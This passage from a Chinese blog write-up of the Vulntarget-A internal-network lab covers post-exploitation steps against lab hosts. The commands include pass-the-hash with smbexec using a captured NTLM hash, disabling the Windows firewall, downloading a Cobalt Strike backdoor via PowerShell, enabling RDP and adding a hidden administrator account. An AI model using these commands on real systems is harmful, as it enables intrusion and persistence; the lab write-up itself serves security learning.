+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">proxychains python<span class="hljs-number">3</span> smbexec.py -hashes aad<span class="hljs-number">3</span>b<span class="hljs-number">435</span>b<span class="hljs-number">51404</span>eeaad<span class="hljs-number">3</span>b<span class="hljs-number">435</span>b<span class="hljs-number">51404</span>ee:<span class="hljs-keyword">c</span><span class="hljs-number">7</span><span class="hljs-keyword">c</span><span class="hljs-number">654</span>da<span class="hljs-number">31</span>ce<span class="hljs-number">51</span>cbeecfef<span class="hljs-number">99e637</span>be<span class="hljs-number">15</span> administrator<span class="hljs-title">@10</span>.<span class="hljs-number">0.10</span>.<span class="hljs-number">110</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902222457300.png" srcset="/img/loading.gif" lazyload alt="image-20240902222457300"></p>
+<figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pf">netsh advfirewall show allprofiles <span class="hljs-comment"># 查看防火墙配置（这里是乱码）</span><br>netSh advfirewall <span class="hljs-built_in">set</span> allprofiles <span class="hljs-keyword">state</span> off <span class="hljs-comment"># 关闭防火墙</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902222527659.png" srcset="/img/loading.gif" lazyload alt="image-20240902222527659"></p>
+<h2 id="上线CS"><a href="#上线CS" class="headerlink" title="上线CS"></a>上线CS</h2><p>创建一个正向监听器</p>
+<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902222611366.png" srcset="/img/loading.gif" lazyload alt="image-20240902222611366"></p>
+<p>使用刚刚创建的监听器，创建后门 (检查的时候发现这张图有问题，应该选择Windows Stageless Payload)</p>
+<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902222718394.png" srcset="/img/loading.gif" lazyload alt="image-20240902222718394"></p>
+<p>因为Server2016有web服务，Server2016和2019能通信，直接上传后门</p>
+<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902223029810.png" srcset="/img/loading.gif" lazyload alt="image-20240902223029810"></p>
+<p>Server2019下载后门<code>powershell (new-object System.Net.WebClient).DownloadFile(&#39;http://10.0.10.111/Z.exe&#39;,&#39;C:\Z.exe&#39;)</code></p>
+<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902223727949.png" srcset="/img/loading.gif" lazyload alt="image-20240902223727949"></p>
+<p>Server2016 Beacon主动连接一下<code>shell connect 10.0.10.110 444</code></p>
+<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902223803004.png" srcset="/img/loading.gif" lazyload alt="image-20240902223803004"></p>
+<h2 id="远程桌面连接"><a href="#远程桌面连接" class="headerlink" title="远程桌面连接"></a>远程桌面连接</h2><p>设置一下SOCKS 代理</p>
+<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902212438602.png" srcset="/img/loading.gif" lazyload alt="image-20240902212438602"></p>
+<p>开启远程登录，防火墙允许TCP通信3389</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">wmic RDTOGGLE WHERE <span class="hljs-attribute">ServerName</span>=<span class="hljs-string">&#x27;%COMPUTERNAME%&#x27;</span> call SetAllowTSConnections 1<br><br>netsh advfirewall<span class="hljs-built_in"> firewall </span><span class="hljs-built_in">add</span> rule <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Remote Desktop&quot;</span> <span class="hljs-attribute">protocol</span>=TCP <span class="hljs-attribute">dir</span>=in <span class="hljs-attribute">localport</span>=3389 <span class="hljs-attribute">action</span>=allow<br><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902225853099.png" srcset="/img/loading.gif" lazyload alt="image-20240902225853099"></p>
+<p>密钥的话可以用刚刚获得<code>Administrator:500:aad3b435b51404eeaad3b435b51404ee:c7c654da31ce51cbeecfef99e637be15:::</code>破解一下</p>
+<p>或者添加一个管理员用户</p>
+<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-comment"># 添加用户</span><br>net <span class="hljs-keyword">user</span> <span class="hljs-title">hack</span> user123.com /add<br><span class="hljs-comment"># 添加到管理员组</span><br>net localgroup administrators hack /add<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902225250187.png" srcset="/img/loading.gif" lazyload alt="image-20240902225250187"></p>
+<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902225526376.png" srcset="/img/loading.gif" lazyload alt="image-20240902225526376"></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这套靶机主要考验，正、反向连接之间与防火墙的关系；socks代理；比较知名的漏洞永恒之蓝、CVE-2020-1472的利用方式；以及一些内网常用的命令。感觉挺适合我的，毕竟以前学了，没有真正上手实操过，自己动手实操发现确实还是有一定差距。</p>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a target="_blank" rel="noopener" href="https://forum.butian.net/share/1832">看我用内网MSF打公网永恒之蓝</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" class="category-chain-item">内网安全</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/" class="print-no-link">#内网靶场渗透实战</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>内网靶场渗透实战-Vulntarget-A</div>
+      <div>https://sp4rks3.github.io/2024/08/31/内网安全/内网靶场渗透实战-Vulntarget-A/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Sp4rks3</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年8月31日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/08/19/JAVA%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/%E7%BB%93%E5%90%88%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B3%A8%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/" title="结合反序列化注入内存马">
+                        <span class="hidden-mobile">结合反序列化注入内存马</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+    <div id="giscus" class="giscus"></div>
+    <script type="text/javascript">
+      Fluid.utils.loadComments('#giscus', function() {
+        var options = {"repo":"Sp4rks3/Sp4rks3.github.io","repo-id":"R_kgDOL2R4Xw","category":"Announcements","category-id":"DIC_kwDOL2R4X84ChqtT","theme-light":"light","theme-dark":"dark","mapping":"pathname","reactions-enabled":1,"emit-metadata":0,"input-position":"top","lang":"zh-CN"};
+        var attributes = {};
+        for (let option in options) {
+          if (!option.startsWith('theme-')) {
+            var key = option.startsWith('data-') ? option : 'data-' + option;
+            attributes[key] = options[option];
+          }
+        }
+        var light = 'light';
+        var dark = 'dark';
+        window.GiscusThemeLight = light;
+        window.GiscusThemeDark = dark;
+        attributes['data-theme'] = document.documentElement.getAttribute('data-user-color-scheme') === 'dark' ? dark : light;
+        for (let attribute in attributes) {
+          var value = attributes[attribute];
+          if (value === undefined || value === null || value === '') {
+            delete attributes[attribute];
+          }
+        }
+        var s = document.createElement('script');
+        s.setAttribute('src', 'https://giscus.app/client.js');
+        s.setAttribute('crossorigin', 'anonymous');
+        for (let attribute in attributes) {
+          s.setAttribute(attribute, attributes[attribute]);
+        }
+        var ss = document.getElementsByTagName('script');
+        var e = ss.length > 0 ? ss[ss.length - 1] : document.head || document.documentElement;
+        e.parentNode.insertBefore(s, e.nextSibling);
+      });
+    </script>
+    <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
